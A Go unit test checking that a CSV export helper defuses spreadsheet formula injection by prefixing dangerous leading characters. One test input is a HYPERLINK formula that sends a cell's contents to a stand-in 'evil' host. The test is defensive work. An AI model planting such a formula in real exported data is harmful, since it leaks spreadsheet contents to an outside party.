package handlers

import "testing"

// Regression for: escapeCSV must neutralize spreadsheet formula injection.
// A cell whose first char is = + - @ tab or CR executes as a formula in
// Excel/Sheets; inventory values are attacker-influenceable via discovery.
func TestEscapeCSV_NeutralizesFormulaInjection(t *testing.T) {
	cases := []struct{ in, want string }{
		{`=HYPERLINK("http://evil/?"&A1)`, `"'=HYPERLINK(""http://evil/?""&A1)"`}, // = + comma/quote → prefixed AND quoted
		{"=cmd", "'=cmd"},
		{"+1+1", "'+1+1"},
		{"-2+3", "'-2+3"},
		{"@SUM(A1)", "'@SUM(A1)"},
		{"\tlead-tab", "'\tlead-tab"},
		{"normal.host", "normal.host"}, // safe → untouched
		{"TLS1.2", "TLS1.2"},           // safe
		{"", ""},                       // empty → untouched
	}
	for _, c := range cases {
		if got := escapeCSV(c.in); got != c.want {
			t.Errorf("escapeCSV(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}
